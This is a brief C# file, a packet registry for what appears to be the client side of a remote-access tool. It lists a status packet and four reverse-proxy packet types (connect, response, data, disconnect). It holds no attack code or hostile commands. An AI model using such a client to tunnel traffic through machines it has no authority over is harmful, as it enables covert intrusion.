using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace xClient.Core.Packets
{
    public class PacketRegistery
    {
        public static Type[] GetPacketTypes()
        {
            return new Type[]
            {
                typeof (Packets.ClientPackets.SetStatus),
                typeof (ReverseProxy.Packets.ReverseProxyConnect),
                typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                typeof (ReverseProxy.Packets.ReverseProxyData),
                typeof (ReverseProxy.Packets.ReverseProxyDisconnect),

            };
        }
    }
}
